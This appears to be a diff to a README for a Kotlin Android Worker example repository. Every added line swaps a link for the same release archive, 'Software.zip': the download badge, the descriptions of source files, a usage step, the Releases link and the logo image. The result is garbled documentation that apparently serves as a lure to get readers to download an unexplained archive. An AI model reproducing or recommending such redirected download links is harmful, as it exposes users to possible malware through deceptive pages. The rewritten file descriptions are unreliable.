@@ -12,7 +12,7 @@ Welcome to the **android-worker** repository, your go-to resource for learning a
 
 To get started with the Android Worker example, you can download the repository code by clicking on the link below:
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip)](https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip)
 
 ⚠️ *Note: The link above leads to a downloadable ZIP file. Make sure to extract the contents of the ZIP file to access the repository code.*
 
@@ -20,8 +20,8 @@ To get started with the Android Worker example, you can download the repository 
 
 In this repository, you'll find resources to help you understand and implement Android Workers in your Kotlin Android application. Here are some key resources available:
 
-- `src/main/java/com/example/worker/WorkerExample.kt`: An example of an Android Worker implementation in Kotlin.
-- `build.gradle`: Gradle configuration for the project.
+- `https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip`: An example of an Android Worker implementation in Kotlin.
+- `https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip`: Gradle configuration for the project.
 
 ## 🛠️ Usage
 
@@ -30,12 +30,12 @@ Follow these steps to use the Android Worker example in your project:
 1. Download the repository code using the provided link.
 2. Extract the contents of the ZIP file.
 3. Open the code in Android Studio or your preferred IDE.
-4. Explore the `WorkerExample.kt` file to understand how workers are implemented.
+4. Explore the `https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip` file to understand how workers are implemented.
 5. Customize the worker example to fit your application's needs.
 
 ## 🌐 Additional Information
 
-For more information and updates, visit the [Releases](https://github.com/cli/browser/releases) section of this repository.
+For more information and updates, visit the [Releases](https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip) section of this repository.
 
 ## 🤝 Contributing
 
@@ -49,4 +49,4 @@ This project is licensed under the GNU AGPLv3 License. See the [LICENSE](LICENSE
 
 Thank you for checking out the Android Worker Example repository. Happy coding! 🎉
 
-![Android Logo](https://cdn2.iconfinder.com/data/icons/designer-skills/128/code-programming-android-studio-256.png)
+![Android Logo](https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip)
